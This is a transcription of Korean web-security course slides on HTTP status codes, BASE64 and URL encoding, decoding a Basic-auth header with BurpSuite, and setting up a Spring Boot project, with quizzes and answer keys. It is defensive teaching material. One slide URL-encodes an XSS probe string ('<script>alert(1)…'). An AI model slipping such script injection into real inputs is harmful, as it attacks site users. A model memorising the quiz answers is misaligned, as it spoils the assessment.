403(Forbidden, 금지됨) 서버가 요청을 거부함. 예를 들어, 사용자가 리소스에 대한 필요 권한을 갖고 있지 않다.
(401은 인증 실패, 403은 인가 실패라고 볼 수 있음)
404(Not Found, 찾을 수 없음) 서버가 요청한 페이지(Resource)를 찾을 수 없음
405(허용되지 않는 방법) 요청에 지정된 방법을 사용할 수 없음 ex)POST 방식으로 요청을 받는 서버에 GET 요청을 보내는 경우,
또는 읽기 전용 리소스에 PUT 요청을 보내는 경우
406(허용되지 않음) 요청한 페이지가 요청한 콘텐츠 특성으로 응답할 수 없음
407(프록시 인증 필요) 이 상태 코드는 401(권한 없음)과 비슷하지만 요청자가 프록시를 사용하여 인증해야 함.
408(요청 시간초과) 서버의 요청 대기가 시간을 초과함
409(충돌) 서버가 요청을 수행하는 중에 충돌이 발생함.
서버는 PUT 요청과 충돌하는 PUT 요청에 대한 응답으로 이 코드를 요청 간 차이점 목록과 함께 표시

---

## [2-SLIDES] 3주차 1차시 p.33 · HTTP Response Status Code
HTTP Response Status Code
410(사라짐) 요청한 리소스가 영구적으로 삭제되었을 때 이 응답을 표시
411(길이 필요) 서버는 유효한 콘텐츠 길이 헤더 입력란 없이는 요청을 수락하지 않음
412(사전조건 실패) 서버가 요청자가 요청 시 부과한 사전조건을 만족하지 않음
413(요청 속성이 너무 큼) 요청이 너무 커서 서버가 처리할 수 없음
414(요청 URI가 너무 김) 요청 URI(일반적으로 URL)가 너무 길어 서버가 처리할 수 없음
415(지원되지 않는 미디어 유형) 요청이 요청한 페이지에서 지원하지 않는 형식으로 되어 있음
416(처리할 수 없는 요청범위) 요청이 페이지에서 처리할 수 없는 범위에 해당되는 경우 서버는 이 상태 코드를 표시
417(예상 실패) 서버는 Expect 요청 헤더 입력란의 요구사항을 만족할 수 없음
500(내부 서버 오류) 서버에 오류가 발생하여 요청을 수행할 수 없음
501(구현되지 않음) 서버에 요청을 수행할 수 있는 기능이 없음. ex)서버가 요청 메소드를 인식하지 못할 때 이 코드를 표시
502 (Bad Gateway, 불량 게이트웨이) 서버가 게이트웨이나 프록시 역할을 하고 있거나 또는 업스트림 서버에서 잘못된 응답을 받음
503(서비스를 사용할 수 없음) 서버가 오버로드되었거나 유지관리를 위해 다운되었기 때문에 현재 서버를 사용할 수 없음
504(게이트웨이 시간초과) 서버가 게이트웨이나 프록시 역할을 하고 있거나 또는 업스트림 서버에서 제때 요청을 받지 못함
505(HTTP 버전이 지원되지 않음) 서버가 요청에 사용된 HTTP 프로토콜 버전을 지원하지 않음
506(Variant Also Negotiates, RFC 2295)
507(용량 부족, WebDAV; RFC 4918)
508(루프 감지됨, WebDAV; RFC 5842)
509(대역폭 제한 초과, Apache bw/limited extension)
510(확장되지 않음, RFC 2774)
511(네트워크 인증 필요, RFC 6585)

---

## [2-SLIDES] 3주차 1차시 p.34 · 실습환경 구축-1
실습환경 구축-1
01 실습환경 구축
02 웹과 HTTP 구조 이해
03 데이터 인코딩

---

## [2-SLIDES] 3주차 1차시 p.35 · 데이터 인코딩 개요
데이터 인코딩 개요
데이터를 특정 규칙에 따라 다른 형식으로 변환하는 과정
인코딩이 필요한 이유
〮 데이터 전송: 다양한 환경에서 데이터가 올바르게 해석되도록 보장
〮 보안 강화: 입력 값을 안전하게 처리하여 XSS, HTML 인젝션 등 보안 취약점 예방
〮 호환성: 서로 다른 시스템 간에 데이터 포맷의 차이로 인한 오류 방지
인코딩 vs 암호화
〮 인코딩은 데이터를 다른 형태로 변환해도, 누구나 역 변환(디코딩) 가능
〮 암호화는 보안 목적으로 데이터를 변환하며, 복호화를 위해 키가 필요
주요 인코딩 유형
〮 BASE64 인코딩
〮 URL 인코딩

---

## [2-SLIDES] 3주차 1차시 p.36 · 03 데이터 인코딩
03 데이터 인코딩
BASE64 인코딩
이진 데이터를 텍스트 형식으로 변환하는 인코딩 방식
특징
〮 데이터를 6비트 단위로 분할하여, 총 64개의 문자 집합(A-Z, a-z, 0-9, +, /)으로 표현
〮 6비트씩 처리하므로 부족한 비트는 0으로 패딩 처리되며, =로 표현
BASE64를 사용하는 이유
〮 이메일, JSON, XML 등 텍스트 전송 환경에서 안전하게 사용 가능
〮 네트워크나 시스템간 전송 시 발생할 수 있는 데이터 손상 및 인코딩 문제를 방지
인코딩 사례
Hello, World! SGVsbG8sIFdvcmxkIQ==

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[인코딩 사례 도식] `Hello, World!` → (BASE64) → `SGVsbG8sIFdvcmxkIQ==`  (끝의 `==`가 패딩)

---

## [2-SLIDES] 3주차 1차시 p.37 · URL 인코딩
URL 인코딩
URL에서 사용이 불가능한 문자를 안전하게 표현하기 위해, 특정 문자를 % 기호와 ASCII 16진수 코드로 변환하는 방식
- URL 에서 사용할 수 없는 문자 처리
URL에서는 공백, ?, &, #, /, : 등의 문자들이 특별한 의미를 가짐
ex) https://example.com/search?query=hello world ➔ https://example.com/search?query=hello%20world
- 비 ASCII 문자(한글, 일본어 등) 처리
URL은 ASCII 문자 집합(영어, 숫자, 일부특수문자)만 허용
ex) 한글 ➔ %ED%95%9C%EA%B8%80
- 보안 및 일관성 유지
웹서버와 클라이언트 간 통신에서 일부 문자(<, >, “ 등)는 보안 문제를 유발할 수 있어 인코딩을 통해 안전하게 전송
ex) <script>alert(1);<script> ➔ %3Cscript%3Ealert%281%29%3B%3Cscript%3E

---

## [2-SLIDES] 3주차 1차시 p.38 · URL 인코딩이 필요한 문자 목록
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
URL 인코딩이 필요한 문자 목록

**인코딩이 필요한 문자**

| 문자유형 | 예 | 인코딩된 값 |
| --- | --- | --- |
| 공백 | (공백) | `%20` |
| 예약문자(URL구조에서 사용) | `?` `&` `#` `/` `:` | `%3F` `%26` `%23` `%2F` `%3A` |
| 특수문자 | `!` `@` `$` `+` `=` | `%21` `%40` `%24` `%2B` `%3D` |
| 비ASCII 문자(한글, 특수기호..) | `한` `日` | `%ED%95%9C` `%E6%97%A5` |

**안전한 문자(인코딩 불필요)**
- 영문 대/소문자
- 숫자
- 일부 특수문자 (`-` `_` `.` `~`)

---

## [2-SLIDES] 3주차 1차시 p.39 · BurpSuite를 통해 BASE64 디코딩
BurpSuite를 통해 BASE64 디코딩
1. 파이어폭스 주소창에 주소 입력
파이어폭스 주소창에 아래 주소 입력
http://httpbin.org/basic-auth/user/passwd
화면상에 로그인 창이 나타남
BurpSuite Proxy에서 [Intercept is off] 버튼을 눌러
[Intercept is on] 으로 전환
사용자 이름 및 암호에 아무 값이나 입력한 후 [확인] 버튼

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[캡처: 파이어폭스(위)와 BurpSuite(아래)]
- 파이어폭스 주소창 `httpbin.org/basic-auth/user/passwd` → 'http://httpbin.org — 이 사이트에서 로그인을 요청합니다.' 팝업: 사용자 이름 `usertest`, 비밀번호 `••••••••` 입력 후 [로그인] (빨간 화살표)
- BurpSuite Proxy > Intercept 탭에서 **Intercept is on** 버튼(빨간 화살표) — 'Requests sent by Burp's browser will be held here so that you can analyze and modify them before forwarding them to the target server.'

---

## [2-SLIDES] 3주차 1차시 p.40 · BurpSuite를 통해 BASE64 디코딩
BurpSuite를 통해 BASE64 디코딩
2. BurpSuite Intercept 화면에 Request 내용이 보임
HTTP Request의 Header 내용 중 Authorization 내용에
BASE64 인코딩된 내용이 들어있음

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite Intercept 캡처 — Request to http://httpbin.org:80 [44.217.196.51]]

```http
GET /basic-auth/user/passwd HTTP/1.1
Host: httpbin.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Authorization: Basic dXNlcnRlc3Q6cGFzc3Rlc3Q=      ← 빨간 상자·화살표
```

---

## [2-SLIDES] 3주차 1차시 p.41 · BurpSuite를 통해 BASE64 디코딩
BurpSuite를 통해 BASE64 디코딩
3. 해당 BASE64 인코딩 내용 선택하여 디코딩
BASE64 인코딩된 문자열을 더블클릭하면 우측에 Base64
디코딩된 내용을 볼 수 있음
해당 문자열을 CTRL-C (Copy) 함

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite 캡처: 10행 `Authorization: Basic dXNlcnRlc3Q6cGFzc3Rlc3Q=` 의 값을 더블클릭해 주황색으로 선택(빨간 화살표)]

오른쪽 **Inspector** 패널:
- Selection: 23 (0x17)
- Selected text: `dXNlcnRlc3Q6cGFzc3Rlc3Q`
- **Decoded from: Base64** → `usertest:passtest` (빨간 상자)

→ Basic 인증 헤더는 암호화가 아니라 **인코딩**이라 `아이디:비밀번호`가 그대로 드러남

---

## [2-SLIDES] 3주차 1차시 p.42 · BurpSuite를 통해 BASE64 디코딩
BurpSuite를 통해 BASE64 디코딩
4. Decode 메뉴에서 디코딩
복사한 BASE64문자열을 입력창에 붙여 넣고 우측 'Decode as …' 에서 Base64 선택
하단에 디코딩된 문자열이 출력됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite **Decoder** 탭 캡처 2장]
1. 입력창에 `dXNlcnRlc3Q6cGFzc3Rlc3Q` 붙여넣기 → 오른쪽 'Decode as …' 목록(Plain, URL, HTML, **Base64**(빨간 상자), ASCII hex, Hex, Octal, Binary, Gzip)에서 Base64 선택
2. 아래 결과창에 디코딩된 문자열 출력 (캡처에는 `usertest:passtec3Q`로 보임)

※ 캡처 결과가 앞 쪽 Inspector의 `usertest:passtest`와 다르게 보이는데, 복사할 때 끝의 패딩 `=`가 빠지는 등 입력 문자열 차이로 보입니다. 올바른 디코딩 결과는 `usertest:passtest`입니다.

---

## [2-SLIDES] 3주차 1차시 p.43 · BurpSuite를 통해 URL인코딩/디코딩
BurpSuite를 통해 URL인코딩/디코딩
1. 입력창에 사이트 주소 붙여 넣고 인코딩
앞서 접속했던 사이트 주소를 입력창에 넣고 'Encode as …' 선택
종류 중 'URL' 선택
하단에 인코딩된 문자열이 출력됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite **Decoder** 캡처]
- 입력창: `http://httpbin.org/basic-auth/user/passwd`
- 'Encode as …' 목록(Plain, **URL**(빨간 화살표), HTML, Base64, ASCII hex, Hex, Octal, Binary, Gzip)에서 URL 선택
- 결과(빨간 상자): `%68%74%74%70%3a%2f%2f%68%74%74%70%62%69%6e%2e…` — 영문자까지 **모든 글자를 %16진수로** 바꾼 형태 (BurpSuite의 URL 인코딩은 전체 문자를 인코딩함)

---

## [2-SLIDES] 3주차 1차시 p.44 · BurpSuite를 통해 URL인코딩/디코딩
BurpSuite를 통해 URL인코딩/디코딩
2. 인코딩 된 문자열로 다시 URL 디코딩
앞서 접속했던 사이트 주소를 입력창에 넣고 'Encode as …' 선택
종류 중 'URL' 선택
하단에 디코딩된 원본 문자열이 출력됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[BurpSuite Decoder 캡처]
- 가운데 칸: 인코딩된 문자열 `…%75%74%68%2f%75%73%65%72%2f%70%61%73%73%77%64` (빨간 배경)
- 'Decode as …' 목록에서 **URL**(빨간 화살표) 선택
- 결과(빨간 상자): `http://httpbin.org/basic-auth/user/passwd` — 원본으로 복원됨

---

## [2-SLIDES] 3주차 1차시 p.45 · 요약 정리
요약 정리
- 실습환경은 Spring Boot 기반 웹 애플리케이션과 BurpSuite 프록시로 구성되어 있다.
- 웹 서비스는 브라우저, 웹 서버, WAS, DB 간의 통신 흐름으로 운영된다.
- HTTP는 요청과 응답 메시지로 통신하며, 상태 정보를 유지하지 않는다.
- HTTP 요청 안에는 바디 외에 메서드, 경로, 쿠키, 파라미터 같은 헤더 등이 들어있다.
- HTTP 응답 안에는 바디 외에 상태 코드가 들어있어, 서버의 처리 상태를 알 수 있다..
- BASE64와 URL 인코딩은 특수 문자나 바이너리 데이터를 안전하게 전달하기 위해 사용된다.

---

## [2-SLIDES] 3주차 1차시 p.46 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지 안전한 소프트
웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어
- SpringBoot - https://spring.io/
- Spring Initializ - https://start.spring.io/
- Postman - https://www.postman.com/

---

## [2-SLIDES] 3주차 1차시 p.47 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 3주차 1차시 p.48 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈

1. 다음 중 웹 애플리케이션 서버 로직의 3대 계층에 속하지 않는 것은?
   1) 데이터 계층　2) 네트워크 계층　3) 비즈니스 계층　4) 프레젠테이션 계층
2. 다음 중 HTTP에 대한 설명으로 옳은 것은?
   1) 무상태 방식
   2) UDP를 기본적으로 사용
   3) Request Method로 GET, POST, PUT, REMOVE 등이 있음
   4) Response Status Code로 2xx는 서버에 에러가 있다는 의미
3. 다음 중 BASE64 인코딩에 대한 내용으로 틀린 것은?
   1) 이메일, JSON, XML 등 텍스트 전송 환경에서 안전하게 사용
   2) 부족한 비트는 0으로 패딩 처리되며, =로 표현
   3) 데이터 손상 및 인코딩 문제를 방지함
   4) 데이터를 8비트 단위로 분할하며, 총 64개의 문자 집합으로 표현

---

## [2-SLIDES] 3주차 1차시 p.49 · 퀴즈 정답
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈 정답

1. **2) 네트워크 계층** — 웹 애플리케이션 서버 로직은 프레젠테이션 계층, 비즈니스 계층, 데이터 계층으로 구성되어 있습니다.
2. **1) 무상태 방식** — HTTP는 주로 TCP기반 무상태 방식으로 통신하며, GET, POST, PUT, DELETE 등의 Request Method를 사용합니다. Response Status Code가 2xx인 경우는 요청이 성공적으로 이루어졌다는 의미입니다.
3. **4) 데이터를 8비트 단위로 분할하며, 총 64개의 문자 집합으로 표현** — BASE64는 데이터를 6비트 단위로 분할합니다.

# [2-SLIDES] 3주차 2차시 — Spring Boot 개발 환경·실습
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT

## [2-SLIDES] 3주차 2차시 p.1 · 실습환경 구축-2
실습환경 구축-2
01 SpringBoot 프레임워크를 활용한 웹 프로젝트 구축(1)

---

## [2-SLIDES] 3주차 2차시 p.2 · 학습 목표
학습 목표
SpringBoot 프레임워크의 개념과 역할을 이해한다.
SpringBoot 프레임워크의 기본 사용법을 익힌다.

---

## [2-SLIDES] 3주차 2차시 p.3 · 학습 내용
학습 내용
1. 프레임워크와 플랫폼의 개념 및 차이
2. 기본 웹 애플리케이션 작성 및 실행

---

## [2-SLIDES] 3주차 2차시 p.4 · 실습환경 구축-2
실습환경 구축-2
01 SpringBoot 프레임워크를 활용한 웹프로젝트 구축(1)

---

## [2-SLIDES] 3주차 2차시 p.5 · 프레임워크(Framework)와 플랫폼(Platform) 개념 및 차이
프레임워크(Framework)와 플랫폼(Platform) 개념 및 차이
프레임워크와 플랫폼은 소프트웨어 개발에 자주 등장하는 개념이지만 목적과 역할이 다름
프레임워크(Framework)란?
소프트웨어 개발을 위한 구조(틀)와 규칙을 제공하는 재사용 가능한 코드 라이브러리
특징
개발에 필요한 기본 구조 제공(코드 아키텍처, 디자인 패턴 포함)
반복적인 작업을 자동화하여 생산성을 높임(ex: 인증, 데이터베이스 연결)
특정한 개발방식(패턴)을 강제함 (ex: MVC패턴)
개발자가 핵심 로직에 집중할 수 있도록 지원
- 프레임워크 예시
Spring(Java) : 엔터프라이즈급 웹 애플리케이션 개발 프레임워크
- Django(Python) : MVC 패턴기반의 파이썬 웹 프레임워크
- React(Javascript) : UI 컴포넌트기반의 웹 프론트엔드 개발 프레임워크

---

## [2-SLIDES] 3주차 2차시 p.6 · 프레임워크(Framework)와 플랫폼(Platform) 개념 및 차이
프레임워크(Framework)와 플랫폼(Platform) 개념 및 차이
플랫폼(Platform)이란?
애플리케이션이 실행될 수 있는 환경. 하드웨어와 소프트웨어의 조합을 포함할 수 있으며, 개발자나 사용자가
서비스를 만들고 운영할 수 있도록 지원
- 특징:
애플리케이션이 실행될 기반
- 개발자에게 API 및 서비스 제공(ex: AWS, Android)
- 하드웨어 또는 소프트웨어 기반의 서비스 생태계 형성
플랫폼 종류:
- Window, macOS, Linux: 애플리케이션 실행 환경 제공
- AWS, Azure, GCP : 클라우드 기반 컴퓨팅 및 서비스 플랫폼
- Anroid, iOS : 모바일 앱 개발 및 실행 환경
- Unity, Unreal Engine : 게임 개발 및 실행 환경

---

## [2-SLIDES] 3주차 2차시 p.7 · 프레임워크(Framework)와 플랫폼(Platform) 개념 및 차이 
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
프레임워크(Framework)와 플랫폼(Platform) 개념 및 차이 — 프레임워크 vs 플랫폼 비교

| 구분 | 프레임워크 | 플랫폼 |
| --- | --- | --- |
| 역할 | 개발을 위한 기본 구조 제공 | 애플리케이션이 실행되는 환경 제공 |
| 범위 | 제한적(특정 도구 및 기능 제공) | 넓음(하드웨어, 소프트웨어, 서비스 포함) |
| 예시 | Spring, Django, React, Flutter | Window, Linux, Android, iOS |
| 강제성 | 특정 패턴을 강제(ex: MVC) | 실행환경만 제공(개발방식을 강제하지 않음) |

---

## [2-SLIDES] 3주차 2차시 p.8 · Spring Boot 프레임워크란?
Spring Boot 프레임워크란?
Spring Boot는 자바기반의 웹 애플리케이션을 만들 수 있는 Spring 프레임워크를 기반으로 개발 프레임워크로,
설정(Configuration) 없이 빠르게 Spring 기반 애플리케이션을 개발 할 수 있도록 지원하는 프레임워크
SpringBoot은 내장 웹서버 제공, 자동설정(Auto Configuration), 의존성 관리 등의 기능을 통해
개발자의 생산성을 극대화 함.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식 2개]

**왼쪽 — 계층**: User ↕ **Spring Boot** ↕ **Spring** (Spring Boot가 사용자와 Spring 사이에서 설정을 대신해 줌)

**오른쪽 — Spring Framework 모듈 구성**

| 영역 | 모듈 |
| --- | --- |
| Data Access / Integration | JDBC, ORM, OXM, JMS, Transaction |
| Web | WebSocket, Servlet, Web, Portlet |
| (중간 줄) | AOP, Aspects, Instrumentation, Message |
| Core Container | Beans, Core, Context, SpEL |
| (맨 아래) | TEST |

---

## [2-SLIDES] 3주차 2차시 p.9 · Spring Boot vs. Spring Framework
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
Spring Boot vs. Spring Framework

| 비교항목 | Spring Framework | Spring Boot Framework |
| --- | --- | --- |
| 설정방식 | XML 또는 자바 설정 필요 | 자동 설정(Auto Configuration) 지원 |
| 의존성 관리 | 수동으로 라이브러리 추가 | spring-boot-starter로 간편하게 관리 |
| 내장 서버 | 별도 WAS 필요 | 내장 서버 제공(Tomcat 기본 포함) |
| 배포 방식 | WAR 패키징 필요 (WAS필요) | JAR 패키징(독립 실행 가능) |
| 학습난이도 | 상대적으로 복잡 | 쉬운 시작 가능 |

---

## [2-SLIDES] 3주차 2차시 p.10 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step1. STS (Spring Tool Suite) 다운로드 및 설치
공식 사이트(https://spring.io/tools)에 접속하여 IDE를 다운로드 받는다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[캡처: 'Spring Tools for Eclipse — Free. Open source.' 다운로드 버튼 5개 — 4.28.1 - LINUX X86_64 / LINUX ARM_64 / MACOS X86_64 / MACOS ARM_64 / **WINDOWS X86_64**, 옆에 STS 화면 캡처와 Eclipse 로고]

---

## [2-SLIDES] 3주차 2차시 p.11 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step2-1. 프로젝트 생성하기(STS로 직접 생성)
1.STS 실행 후 File → New → Spring Starter Project 선택
2.프로젝트 정보 입력
1. Name: hello-spring-boot
2. Type: Maven (기본값)
3. Java Version: 17 (JDK 버전에 맞게 설정)
4. Packaging: Jar (Standalone 실행을 위함)
5. Group: com.example
6. Artifact: hello-spring-boot
7. Package: com.example.hellospringboot
8. Next 클릭
3.필요한 라이브러리 선택
1. Spring Web 추가 (REST API 개발을 위해 필요)
2. Finish 클릭 후 프로젝트 생성

---

## [2-SLIDES] 3주차 2차시 p.12 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step2-2. 프로젝트 생성하기(Spring Initializr를 사용해서 생성 후 가져오기)
1. Spring Initializr 접속
https://start.spring.io/ 접속
2. 프로젝트 설정
- Project: Maven
- Language: Java
- Spring Boot Version: 최신 버전 선택
- Group: com.example
- Artifact: hello-spring-boot
- Packaging: Jar
- Java Version: 17 (또는 현재 설치된 JDK 버전)
3. Dependencies(필수 라이브러리) 추가
Spring Web 선택
4. 프로젝트 다운로드 및 가져오기
Generate 클릭 후 프로젝트 다운로드
STS에서 File → Import → Existing Maven Projects 선택 후 프로젝트를 가져오기

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[Spring Initializr 화면 캡처]
- Project: ○ Gradle-Groovy ○ Gradle-Kotlin ◉ **Maven** / Language: ◉ **Java** ○ Kotlin ○ Groovy
- Spring Boot: ○ 3.5.0 (SNAPSHOT) ○ 3.5.0 (M2) ○ 3.4.4 (SNAPSHOT) ◉ **3.4.3** ○ 3.3.10 (SNAPSHOT) ○ 3.3.9
- Project Metadata: Group `com.example` / Artifact `hello-spring-boot` / Name `hello-spring-boot` / Description `Demo project for Spring Boot` / Package name `com.example.hello-spring-boot`
- Dependencies: **Spring Web** [WEB] — "Build web, including RESTful, applications using Spring MVC. Uses Apache Tomcat as the default embedded container."
- 아래 버튼 [GENERATE CTRL+⏎] [EXPLORE CTRL+SPACE] […]

---

## [2-SLIDES] 3주차 2차시 p.13 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step3. HelloSpringBootApplication.java 생성 및 코드 추가
- @SpringBootApplication: Spring Boot 애플리케이션의 기본 설정을 담당
- SpringApplication.run(HelloSpringBootApplication.class, args); : 애플리케이션 실행

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 이 쪽의 코드는 통째로 이미지]

```java
package com.example.hellospringboot;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;   // 캡처에서는 접혀 있음(import 뒤 □ 표시)

@SpringBootApplication
public class HelloSpringBootApplication {

    public static void main(String[] args) {
        SpringApplication.run(HelloSpringBootApplication.class, args);
    }

}
```

---

## [2-SLIDES] 3주차 2차시 p.14 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step４. HelloController.java 생성 후 코드 추가
- @RestController: REST API를 위한 컨트롤러임을 선언
- @RequestMapping("/api"): 기본 URL 경로를 /api로 설정
- @GetMapping("/hello"): /api/hello 요청이 들어오면 "Hello, Spring Boot!"를 반환

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처 — 이 쪽의 코드는 통째로 이미지]

```java
package com.example.hellospringboot.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api")
public class HelloController {

    @GetMapping("/hello")
    public String sayHello() {
        return "Hello, Spring Boot";
    }
}
```

※ 슬라이드 설명은 `"Hello, Spring Boot!"`를 반환한다고 적혀 있지만, 캡처된 코드의 반환값에는 느낌표가 없습니다(`"Hello, Spring Boot"`). 실습할 때는 코드에 적은 그대로 출력됩니다.

---

## [2-SLIDES] 3주차 2차시 p.15 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step5. Spring Boot 애플리케이션 실행
다음 3가지 방법 중 한가지 방법을 사용하여 실행 할 수 있음
방법1. STS에서 실행
- HelloSpringBootApplication.java 파일 또는 프로젝트 노드에서 우클릭 → Run As → Spring Boot App
클릭
- 콘솔 창에 Tomcat started on port 8080 메시지가 출력되면 실행 성공
방법2. Maven을 사용하여 실행
- STS의 Terminal에서 아래 명령어 실행
mvn spring-boot:run
방법3. JAR 파일을 빌드 후 실행
mvn clean package
Java –jar target/hello-spring-boot-0.0.1-SNAPSHOT.jar

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[명령어 상자]
- 방법2: `mvn spring-boot:run`
- 방법3: `mvn clean package` → `java -jar target/hello-spring-boot-0.0.1-SNAPSHOT.jar` (슬라이드에는 `Java`로 대문자 표기)

---

## [2-SLIDES] 3주차 2차시 p.16 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step6. 웹 브라우저에서 실행확인
웹 브라우저나 Postman(https://www.postman.com/downloads/ 에서 다운로드) 앱을 사용하여 테스트
방법1. 웹 브라우저에서 확인
- 브라우저를 열고 아래 주소 입력
http://localhost:8080/api/hello
- “hello, Spring Boot!” 메시지가 표시되면 성공
방법2. Postman 으로 테스트
- Postman 실행 → GET 요청
- URL 입력: http://localhost:8080/api/hello
- Send 클릭 → 응답 Hello, Spring Boot! 확인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[Postman 로고. 주소 상자: `http://localhost:8080/api/hello`]

---

## [2-SLIDES] 3주차 2차시 p.17 · Spring Boot 기본 사용법
Spring Boot 기본 사용법
Step7. 애플리케이션 종료 또는 재시작
1. Spring Boot 애플리케이션 종료
- STS 콘솔에서 Ctrl + C 또는 Stop(붉은 사각) 버튼 클릭
2. Spring Boot 애플리케이션 재시작
- MainApplication.java 우클릭 → Run As → Spring Boot App

---

## [2-SLIDES] 3주차 2차시 p.18 · 시연 영상
시연 영상
Spring Boot 신규 프로젝트 작성

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[시연 영상 자리 — 'Spring Boot 신규 프로젝트 작성'. PDF에는 영상이 포함되지 않아 빈 화면]

---

## [2-SLIDES] 3주차 2차시 p.19 · 요약 정리
요약 정리
- 프레임워크는 소프트웨어 개발을 위한 구조와 규칙을 제공하는 코드 라이브러리
- 플랫폼은 애플리케이션이 실행될 수 있는 환경을 포괄적으로 칭함
- Spring Boot 프레임워크는 Spring 프레임워크 기반으로 빠르게 자바 기반의 웹 애플리케이션을
만들 수 있도록 지원함
- Spring Initializr를 사용하면 신규 프로젝트를 생성하고 개발 가능

---

## [2-SLIDES] 3주차 2차시 p.20 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지 안전한 소프트
웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어
- SpringBoot - https://spring.io/
- Spring Initializ - https://start.spring.io/
- Postman - https://www.postman.com/

---

## [2-SLIDES] 3주차 2차시 p.21 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 3주차 2차시 p.22 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈

1. 다음 중 프레임워크와 플랫폼에 대한 설명 중 옳은 것은?
   1) 플랫폼은 재사용 가능한 코드 라이브러리이다.
   2) Spring(Java)는 가장 대표적인 운영 플랫폼 중 하나이다.
   3) 프레임워크는 특정한 개발방식(패턴)을 강제한다.
   4) 프레임워크는 하드웨어와 소프트웨어의 조합을 포함한다.
2. 다음 중 프레임워크별 지원 언어에 대한 설명이 잘못된 것은?
   1) Django - Python　2) Spring - Java　3) React - Javascript　4) Ruby on Rails - C/C++
